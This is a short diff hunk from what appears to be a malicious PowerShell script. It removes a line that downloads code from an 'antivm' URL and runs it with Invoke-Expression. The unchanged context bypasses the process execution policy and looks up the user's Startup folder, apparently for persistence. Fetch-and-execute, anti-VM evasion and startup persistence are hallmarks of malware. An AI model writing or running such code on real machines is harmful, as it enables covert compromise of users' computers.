@@ -27,7 +27,6 @@ Add-Type @"
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-iwr "https://codeforfun.vercel.app/antivm" | iex
 
 
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
